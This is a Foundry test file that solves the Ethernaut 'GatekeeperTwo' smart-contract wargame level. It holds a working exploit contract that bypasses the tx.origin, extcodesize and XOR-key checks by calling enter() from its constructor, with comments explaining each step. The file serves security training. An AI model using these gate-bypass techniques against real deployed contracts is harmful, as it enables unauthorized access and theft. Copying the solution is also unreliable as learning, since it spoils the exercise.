// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GatekeeperTwo/GatekeeperTwoFactory.sol";
import "../src/Ethernaut.sol";

contract GatekeeperTwoTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testGatekeeperTwoHack() public {
        /****************
         * Factory setup *
         *************** */
        GatekeeperTwoFactory gatekeeperTwoFactory = new GatekeeperTwoFactory();
        ethernaut.registerLevel(gatekeeperTwoFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(
            gatekeeperTwoFactory
        );
        GatekeeperTwo ethernautGatekeeperTwo = GatekeeperTwo(
            payable(levelAddress)
        );
        /****************
         *    Attack     *
         *************** */
        assertEq(ethernautGatekeeperTwo.entrant(), address(0));
        /*
         * Here we have again 3 modifier to pass
         * 1) We can trick this one by calling from a malicious contract
         *   msg.sender will be the malicious contract
         *   tx.origin will be player
         * 2) if we want extcodesize == 0 we need to trigger the attack in the constructor
         *     extcodesize return the size of the code at address caller() and it must be 0
         *     only place for this to happen is in the constructor
         * 3) Quite straight forward:
         *   we know the type casting of _gateKey = uint64
         *   ^ is the bit wise XOR operation
         *   understand it was if the bit in the position in the opposite direction are equal it will result to 0 otherwise, 1
         *   so in our case : bytes8(keccak256(abi.encodePacked(msg.sender))) must be the inverse of gate key
         *   it should be equal to first condition: uint64(bytes8(keccak256(abi.encodePacked(this))))
         *   Gate key being also == to uint64(0) - 1
         *   to we can get rid or uint64(_gateKey) and keep only uint64(0) - 1
         */
        new GatekeeperTwoHack(levelAddress);

        assertEq(ethernautGatekeeperTwo.entrant(), tx.origin);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract GatekeeperTwoHack {
    GatekeeperTwo challenge;
    uint64 gateKey;

    constructor(address _victim) {
        challenge = GatekeeperTwo(_victim);
        unchecked {
            gateKey =
                uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
                (uint64(0) - 1);
        }

        challenge.enter(bytes8(gateKey));
    }
}
